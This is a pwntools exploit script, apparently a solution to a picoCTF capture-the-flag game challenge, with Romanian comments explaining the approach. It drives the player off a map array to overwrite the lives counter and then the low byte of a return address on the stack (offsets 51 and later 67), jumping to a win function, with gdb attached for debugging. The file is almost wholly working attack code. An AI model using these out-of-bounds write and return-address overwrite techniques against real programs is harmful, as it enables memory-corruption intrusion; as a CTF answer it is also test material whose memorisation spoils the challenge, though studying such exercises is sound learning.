from pwn import *
elf = ELF('/home/kali/Downloads/game')
p = elf.process()
#p=remote('rhea.picoctf.net', 63883)
context.arch='amd64'

#practic pe *(player->y * 90 + map + player-> x)
#se seteaza 0x23(.) pe fosta pozitie
#ca sa fufu player lives care e chiar inaintea hartii
#practic tr, sa modificam map-4 (acolo locuieste player-lives)
#adica -1 * 90 + 86 (pe x=86 si y=-1) apoi intram inapoi in matrice

payload=b'www'+b'a'*8+b'wsp'
#payload to reach y=-1 and x = 86 and solve
#so that we modify the value at map-90+40 = map-4
#that is player lives. 

payload2=b'www'+b'a'*8+b'ws'
#same payload but without solve



#distanta din move-player de la ret addr la map pe stack
#este de 51 . verificat cu hexdump
#deci trbeuie sa acoperim map-0xc cu 0x8049970


#cu hexdump byte $esp vedem ca de la 2c la 0x23 (#-prim char din map)
#personal am numarat nr de bytes da ma rog
#sunt 51 de bytes. deci tr sa alteram byte de pe pozitia map-51.
# y=0, x=-51 -> pasim pe acolo
#ca sa nu ne dea seg fault tr sa nu atingem alte valori de pe stack
#ca sa ne indepartam urcam trei w in sus (-3_ apoi mergem in dreapta
#apoi coboram din nou la 0.
p.recvuntil(b'X\n')
p.sendline(payload)
p.recvuntil(b'X\n')
p.sendline(payload)
p.recvuntil(b'X\n')
p.sendline(payload)
p.recvuntil(b'X\n')
p.sendline(payload2)
p.recvuntil(b'X\n')
#tr sa facem ca char sa devina 0x70 ca sa inlocuiasca bine
p.sendline(b'l'+b'\x70')
p.recvuntil(b'X\n')
p.sendline(b'a'*86)
gdb.attach(p, gdbscript='')
p.sendline(b'w'*3 + b'a'*51 + b's'*3)

#am urcat trei w in sus, apoi 51 a, apoi trei s in jos
#altfel dadeam overwrite la alte chestii importante si primeam seg fault



p.recvuntil(b'X\n')
p.sendline(payload2) 
#ca sa aj la win func trecem de urm check lu LSB = FE
p.sendline(b'l'+b'\xFE')
p.recvuntil(b'X\n')
p.sendline(b'a'*86)
#for some reason s o schimbat offsetu de la 51 la 67
#am vazut cu x/256bx $esp ca hexdump dada prea putine
p.sendline(b'w'*3 + b'a'*67 + b's'*3)

#O MERSSS
p.interactive()
